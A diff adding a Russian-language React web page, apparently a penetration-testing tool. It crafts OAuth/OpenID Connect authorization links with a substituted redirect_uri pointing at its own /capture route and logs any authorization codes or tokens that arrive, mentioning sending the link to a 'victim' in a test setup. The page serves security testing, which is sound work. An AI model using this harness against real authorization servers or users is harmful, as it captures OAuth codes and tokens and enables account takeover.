@@ -1,0 +1,566 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Observer — Исследовательский сервер redirect_uri</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <script crossorigin src="https://unpkg.com/react@18/umd/react.development.js"></script>
+  <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
+  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+  <style>
+    /* ── Design tokens ───────────────────────────────────────────── */
+    :root {
+      --bg:            #fdf8f8;
+      --surface:       #f9f1f1;
+      --surface-inner: #f5eaea;
+      --border:        #d47b7b;
+      --border-soft:   #e8cccc;
+      --text:          #231f20;
+      --muted:         #6b5a5a;
+      --faint:         #b09898;
+      --danger:        #e53e3e;
+      --danger-hover:  #c53030;
+      --success:       #38a169;
+      --success-hover: #2f855a;
+      --neutral:       #7a6b6b;
+      --neutral-hover: #5e5050;
+      --code-bg:       #f0e6e6;
+      --code-border:   #ddc0c0;
+      --tag-code:      #7b2222;
+      --shadow:        0 4px 24px rgba(160, 80, 80, 0.10);
+      --shadow-sm:     0 2px 8px  rgba(160, 80, 80, 0.07);
+      --radius:        12px;
+      --radius-sm:     6px;
+    }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { -webkit-font-smoothing: antialiased; scroll-behavior: smooth; }
+    body {
+      font-family: 'Inter', sans-serif;
+      font-size: 1rem;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      padding: 24px 16px 48px;
+    }
+
+    /* ── Layout ──────────────────────────────────────────────────── */
+    .page { max-width: 1200px; margin: 0 auto; }
+
+    /* ── Shell card ──────────────────────────────────────────────── */
+    .shell {
+      background: var(--surface);
+      border: 2px solid var(--border);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      padding: 28px 24px 24px;
+      margin-bottom: 24px;
+    }
+    .shell + .shell { margin-top: 0; }
+
+    /* ── Header ──────────────────────────────────────────────────── */
+    .hero { text-align: center; margin-bottom: 22px; }
+    .hero h1 {
+      font-size: clamp(1.6rem, 2.2vw, 2rem);
+      font-weight: 800;
+      margin-bottom: 12px;
+      line-height: 1.2;
+    }
+    .hero p {
+      color: var(--muted);
+      font-size: 1rem;
+      line-height: 1.55;
+      max-width: 900px;
+      margin: 0 auto;
+    }
+    .hero code {
+      background: var(--code-bg);
+      border: 1px solid var(--code-border);
+      border-radius: 4px;
+      padding: 1px 6px;
+      font-family: ui-monospace, Consolas, monospace;
+      font-size: .92em;
+      color: var(--tag-code);
+    }
+
+    /* ── Section title ───────────────────────────────────────────── */
+    .section-title {
+      font-size: 1.45rem;
+      font-weight: 700;
+      text-align: center;
+      margin-bottom: 18px;
+    }
+
+    /* ── Two-column grid ─────────────────────────────────────────── */
+    .cols {
+      display: grid;
+      grid-template-columns: repeat(2, minmax(0, 1fr));
+      gap: 20px;
+    }
+    @media (max-width: 860px) { .cols { grid-template-columns: 1fr; } }
+
+    /* ── Label / field ───────────────────────────────────────────── */
+    .field { margin-bottom: 14px; }
+    label {
+      display: block;
+      font-size: 1.1rem;
+      font-weight: 700;
+      margin-bottom: 8px;
+      line-height: 1.4;
+    }
+    label .hint {
+      font-weight: 500;
+      color: var(--muted);
+      font-size: .95em;
+    }
+    input[type="text"], textarea {
+      width: 100%;
+      background: #f0e8e8;
+      border: 2px solid #c9b3b3;
+      border-radius: 4px;
+      padding: 13px 15px;
+      font-size: 1.05rem;
+      font-family: inherit;
+      color: var(--text);
+      outline: none;
+      transition: border-color .18s, box-shadow .18s;
+    }
+    input[type="text"]:focus, textarea:focus {
+      border-color: var(--border);
+      box-shadow: 0 0 0 4px rgba(212, 123, 123, 0.14);
+    }
+    textarea {
+      min-height: 96px;
+      resize: vertical;
+      font-family: ui-monospace, Consolas, monospace;
+      font-size: .95rem;
+    }
+
+    /* ── Buttons ─────────────────────────────────────────────────── */
+    .btns { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 14px; }
+    button {
+      border: none;
+      border-radius: var(--radius-sm);
+      padding: 13px 22px;
+      font-size: .98rem;
+      font-weight: 600;
+      color: #fff;
+      cursor: pointer;
+      transition: background .18s, transform .12s;
+    }
+    button:hover  { transform: translateY(-1px); }
+    button:active { transform: translateY(0); }
+    .btn-danger   { background: var(--danger); }
+    .btn-danger:hover  { background: var(--danger-hover); }
+    .btn-success  { background: var(--success); }
+    .btn-success:hover { background: var(--success-hover); }
+    .btn-neutral  { background: var(--neutral); }
+    .btn-neutral:hover { background: var(--neutral-hover); }
+    .btn-sm { padding: 8px 14px; font-size: .88rem; }
+
+    /* ── Code / JSON block ───────────────────────────────────────── */
+    .json-wrap { margin-top: 22px; }
+    .json-wrap h2 {
+      text-align: center;
+      font-size: 1.7rem;
+      font-weight: 800;
+      margin-bottom: 14px;
+    }
+    pre {
+      background: var(--code-bg);
+      border: 1px solid var(--code-border);
+      border-radius: 4px;
+      padding: 18px 20px;
+      font-family: ui-monospace, SFMono-Regular, Consolas, monospace;
+      font-size: .95rem;
+      line-height: 1.6;
+      overflow: auto;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+    .note {
+      margin-top: 12px;
+      font-size: .97rem;
+      font-weight: 600;
+      color: var(--text);
+    }
+
+    /* ── Status chip ─────────────────────────────────────────────── */
+    .chip {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      padding: 3px 10px;
+      border-radius: 999px;
+      font-size: .8rem;
+      font-weight: 700;
+    }
+    .chip-danger  { background: #fde8e8; color: #962b2b; }
+    .chip-success { background: #e8f5e9; color: #276130; }
+    .chip-neutral { background: #f0e6e6; color: #6b5a5a; }
+
+    /* ── Table ───────────────────────────────────────────────────── */
+    .tbl-wrap {
+      margin-top: 24px;
+      border: 1px solid var(--border-soft);
+      border-radius: var(--radius-sm);
+      overflow: hidden;
+    }
+    table { width: 100%; border-collapse: collapse; background: #fffafa; }
+    th {
+      background: var(--surface-inner);
+      font-size: .88rem;
+      font-weight: 700;
+      padding: 12px 14px;
+      text-align: left;
+      border-bottom: 2px solid var(--border-soft);
+    }
+    td {
+      padding: 11px 14px;
+      border-bottom: 1px solid #f0e0e0;
+      font-size: .9rem;
+      vertical-align: top;
+    }
+    td code {
+      font-family: ui-monospace, Consolas, monospace;
+      color: var(--tag-code);
+      font-size: .88em;
+      word-break: break-all;
+    }
+    tr:last-child td { border-bottom: none; }
+    tr:hover td { background: #fdf4f4; }
+
+    /* ── Divider ─────────────────────────────────────────────────── */
+    .divider {
+      border: none;
+      border-top: 1px solid var(--border-soft);
+      margin: 20px 0;
+    }
+
+    /* ── Capture URI chip ────────────────────────────────────────── */
+    .capture-uri {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      background: var(--surface-inner);
+      border: 1px solid var(--border-soft);
+      border-radius: var(--radius-sm);
+      padding: 10px 14px;
+      margin-top: 12px;
+      flex-wrap: wrap;
+    }
+    .capture-uri span { font-size: .9rem; color: var(--muted); }
+    .capture-uri code {
+      font-family: ui-monospace, Consolas, monospace;
+      font-size: .9rem;
+      color: var(--tag-code);
+      word-break: break-all;
+    }
+
+    /* ── Poll badge ──────────────────────────────────────────────── */
+    .poll-badge {
+      font-size: .8rem;
+      color: var(--muted);
+      margin-top: 8px;
+    }
+    .dot-anim { animation: blink 1.4s infinite; }
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:.3} }
+  </style>
+</head>
+<body>
+<div id="root"></div>
+
+<script type="text/babel">
+const { useState, useEffect, useRef, useCallback } = React;
+
+/* ──────────────────────────────────────────────────────────────────
+   Утилиты
+────────────────────────────────────────────────────────────────── */
+const CAPTURE_PATH = '/capture';
+
+function buildAttackUrl(authEndpoint, clientId, redirectUri, scope, state, responseType) {
+  try {
+    const u = new URL(authEndpoint);
+    u.searchParams.set('client_id',     clientId);
+    u.searchParams.set('response_type', responseType);
+    u.searchParams.set('redirect_uri',  redirectUri);
+    if (scope) u.searchParams.set('scope', scope);
+    if (state) u.searchParams.set('state', state);
+    return u.toString();
+  } catch {
+    return '';
+  }
+}
+
+function riskChip(entry) {
+  if (!entry?.analysis) return null;
+  const { has_code, has_access_token, has_id_token, has_error } = entry.analysis;
+  if (has_code || has_access_token || has_id_token)
+    return <span className="chip chip-danger">⚠ Уязвимость подтверждена</span>;
+  if (has_error)
+    return <span className="chip chip-success">✓ Отклонено сервером авторизации</span>;
+  return <span className="chip chip-neutral">— Нет OAuth-параметров</span>;
+}
+
+/* ──────────────────────────────────────────────────────────────────
+   Главный компонент
+────────────────────────────────────────────────────────────────── */
+function App() {
+  // Форма конструктора запроса
+  const [authEndpoint, setAuthEndpoint] = useState('http://localhost:8080/realms/demo/protocol/openid-connect/auth');
+  const [clientId,     setClientId]     = useState('client-app');
+  const [scope,        setScope]        = useState('openid profile email');
+  const [state,        setState]        = useState('observer-demo-state');
+  const [responseType, setResponseType] = useState('code');
+
+  // Capture URI (автозаполнение из window.location.origin)
+  const [captureUri, setCaptureUri] = useState('');
+  useEffect(() => {
+    setCaptureUri(window.location.origin + CAPTURE_PATH);
+  }, []);
+
+  // Журнал
+  const [log,    setLog]    = useState([]);
+  const [total,  setTotal]  = useState(0);
+  const [lastAt, setLastAt] = useState(null);
+
+  // Детальный просмотр
+  const [selected, setSelected] = useState(null);
+
+  // Результат отображаемого JSON в блоке «Ответ /capture»
+  const [responseBlock, setResponseBlock] = useState({
+    message: 'Ожидание запроса на маршрут /capture',
+    tip:     'Сформируйте ссылку и перейдите по ней (или передайте жертве в тестовой среде)',
+  });
+
+  // Построенная ссылка
+  const [craftedUrl, setCraftedUrl] = useState('');
+  const [copyLabel,  setCopyLabel]  = useState('Копировать ссылку');
+
+  /* ── Получение журнала ── */
+  const fetchLog = useCallback(async () => {
+    try {
+      const r = await fetch('/api/log');
+      const d = await r.json();
+      setLog(d.items || []);
+      setTotal(d.total || 0);
+      setLastAt(new Date().toLocaleTimeString('ru-RU'));
+      if (d.items?.length) {
+        const latest = d.items[0];
+        setResponseBlock({ latest_event: latest });
+        setSelected(prev => prev ? prev : latest);
+      }
+    } catch { /* ignore */ }
+  }, []);
+
+  useEffect(() => {
+    fetchLog();
+    const t = setInterval(fetchLog, 3000);
+    return () => clearInterval(t);
+  }, [fetchLog]);
+
+  /* ── Обработчики ── */
+  const handleBuild = () => {
+    const url = buildAttackUrl(authEndpoint, clientId, captureUri, scope, state, responseType);
+    setCraftedUrl(url);
+    setResponseBlock({
+      action: 'Ссылка сформирована',
+      redirect_uri_substituted: captureUri,
+      full_authorize_url: url || '(не удалось построить URL — проверьте auth endpoint)',
+    });
+  };
+
+  const handleCopy = () => {
+    if (!craftedUrl) return;
+    navigator.clipboard.writeText(craftedUrl).then(() => {
+      setCopyLabel('Скопировано ✓');
+      setTimeout(() => setCopyLabel('Копировать ссылку'), 2000);
+    });
+  };
+
+  const handleOpen = () => { if (craftedUrl) window.open(craftedUrl, '_blank'); };
+
+  const handleClear = async () => {
+    await fetch('/api/log', { method: 'DELETE' });
+    setLog([]);
+    setTotal(0);
+    setSelected(null);
+    setResponseBlock({ message: 'Журнал очищен', tip: 'Сформируйте новый запрос и повторите сценарий' });
+  };
+
+  const handleDownload = () => {
+    const blob = new Blob([JSON.stringify(log, null, 2)], { type: 'application/json' });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = `observer-log-${Date.now()}.json`;
+    a.click();
+  };
+
+  /* ── Render ── */
+  return (
+    <main className="page">
+
+      {/* ── Верхняя карточка: описание ── */}
+      <section className="shell">
+        <header className="hero">
+          <h1>Исследовательский сервер<br/>наблюдения за redirect_uri</h1>
+          <p>
+            Этот сервер выполняет роль <strong>«принимающей стороны»</strong> при тестировании
+            уязвимости неверной валидации <code>redirect_uri</code> в протоколе OpenID Connect / OAuth 2.0.
+            Маршрут <code>/capture</code> логирует все входящие запросы, фиксируя
+            наличие <code>code</code>, <code>access_token</code> и <code>id_token</code> в параметрах,
+            и выводит результат в журнал ниже.
+          </p>
+        </header>
+
+        <hr className="divider"/>
+
+        {/* ── Две колонки ── */}
+        <div className="cols">
+
+          {/* Левая: конструктор запроса */}
+          <article>
+            <div className="section-title">Конструктор запроса авторизации</div>
+
+            <div className="field">
+              <label>Authorization endpoint <span className="hint">(URL /authorize сервера авторизации)</span></label>
+              <input type="text" value={authEndpoint} onChange={e => setAuthEndpoint(e.target.value)} />
+            </div>
+
+            <div className="field">
+              <label>client_id</label>
+              <input type="text" value={clientId} onChange={e => setClientId(e.target.value)} />
+            </div>
+
+            <div className="field">
+              <label>response_type</label>
+              <input type="text" value={responseType} onChange={e => setResponseType(e.target.value)} placeholder="code" />
+            </div>
+
+            <div className="field">
+              <label>scope</label>
+              <input type="text" value={scope} onChange={e => setScope(e.target.value)} />
+            </div>
+
+            <div className="field">
+              <label>state</label>
+              <input type="text" value={state} onChange={e => setState(e.target.value)} />
+            </div>
+
+            <div className="btns">
+              <button className="btn-danger" onClick={handleBuild}>Сформировать запрос</button>
+            </div>
+          </article>
+
+          {/* Правая: capture URI и результат */}
+          <article>
+            <div className="section-title">Приём перенаправления</div>
+
+            <div className="field">
+              <label>
+                redirect_uri наблюдателя
+                <span className="hint"> (передаётся вместо легитимного адреса клиента)</span>
+              </label>
+              <input type="text" value={captureUri} onChange={e => setCaptureUri(e.target.value)} />
+            </div>
+
+            <div className="field">
+              <label>Сформированная ссылка для перехода</label>
+              <textarea readOnly value={craftedUrl || 'После нажатия «Сформировать запрос» здесь появится полный URL на /authorize с подменённым redirect_uri.'} />
+            </div>
+
+            <div className="btns">
+              <button className="btn-success" onClick={handleCopy}>{copyLabel}</button>
+              <button className="btn-success" onClick={handleOpen}>Открыть в браузере</button>
+              <button className="btn-neutral btn-sm" onClick={handleClear}>Очистить журнал</button>
+            </div>
+
+            <div className="capture-uri">
+              <span>Маршрут перехвата:</span>
+              <code>{captureUri}</code>
+            </div>
+          </article>
+        </div>
+
+        {/* ── JSON-ответ ── */}
+        <div className="json-wrap">
+          <h2>Ответ /capture</h2>
+          <pre>{JSON.stringify(responseBlock, null, 2)}</pre>
+          <div className="note">
+            NOTE: если сервер авторизации не валидирует <code>redirect_uri</code>, он перенаправит{' '}
+            <code>code</code> / токены на этот сервер — событие появится в журнале ниже автоматически.
+          </div>
+        </div>
+      </section>
+
+      {/* ── Журнал событий ── */}
+      <section className="shell">
+        <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', flexWrap:'wrap', gap:10, marginBottom:16 }}>
+          <div className="section-title" style={{ margin:0 }}>
+            Журнал перехваченных запросов
+            {total > 0 && <span style={{ marginLeft:10, fontSize:'1rem', fontWeight:500, color:'var(--muted)' }}>({total})</span>}
+          </div>
+          <div style={{ display:'flex', gap:8 }}>
+            <button className="btn-neutral btn-sm" onClick={handleDownload}>Скачать JSON</button>
+            <button className="btn-danger btn-sm" onClick={handleClear}>Очистить</button>
+          </div>
+        </div>
+
+        {lastAt && <div className="poll-badge"><span className="dot-anim">●</span> Обновляется каждые 3 сек · Последнее обновление: {lastAt}</div>}
+
+        <div className="tbl-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th>Время</th>
+                <th>Метод</th>
+                <th>Статус</th>
+                <th>code</th>
+                <th>state</th>
+                <th>Действие</th>
+              </tr>
+            </thead>
+            <tbody>
+              {log.length === 0 ? (
+                <tr><td colSpan="6" style={{ textAlign:'center', color:'var(--muted)', padding:'28px' }}>
+                  Журнал пуст. Сформируйте запрос и выполните переход по ссылке.
+                </td></tr>
+              ) : log.map(item => (
+                <tr key={item.id}>
+                  <td><code>{new Date(item.timestamp).toLocaleString('ru-RU')}</code></td>
+                  <td><span className="chip chip-neutral">{item.method}</span></td>
+                  <td>{riskChip(item)}</td>
+                  <td><code>{item.oauth?.code ?? '—'}</code></td>
+                  <td><code>{item.oauth?.state ?? '—'}</code></td>
+                  <td>
+                    <button className="btn-neutral btn-sm" onClick={() => {
+                      setSelected(item);
+                      setResponseBlock(item);
+                      window.scrollTo({ top: 0, behavior: 'smooth' });
+                    }}>Подробнее</button>
+                  </td>
+                </tr>
+              ))}
+            </tbody>
+          </table>
+        </div>
+
+        {/* Детальный просмотр выбранного события */}
+        {selected && (
+          <div className="json-wrap" style={{ marginTop:20 }}>
+            <h2 style={{ fontSize:'1.4rem' }}>Детали выбранного события</h2>
+            <pre>{JSON.stringify(selected, null, 2)}</pre>
+          </div>
+        )}
+      </section>
+
+    </main>
+  );
+}
+
+ReactDOM.createRoot(document.getElementById('root')).render(<App />);
+</script>
+</body>
+</html>
